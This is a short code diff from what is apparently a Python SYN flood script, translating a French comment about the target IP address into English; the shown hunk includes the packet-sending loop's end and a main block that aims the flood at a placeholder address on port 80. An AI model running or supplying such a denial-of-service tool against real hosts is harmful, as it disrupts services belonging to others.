@@ -8,7 +8,7 @@ def syn_flood(target_ip, target_port):
         send(ip_pkt/tcp_pkt, verbose=0)
 
 if __name__ == '__main__':
-    target_ip = "192.168.1.100"  # Remplacez par l'adresse IP de la cible
+    target_ip = "192.168.1.100"  # Replace with the target's IP address
     target_port = 80  # Port cible (HTTP)
 
     syn_flood(target_ip, target_port)
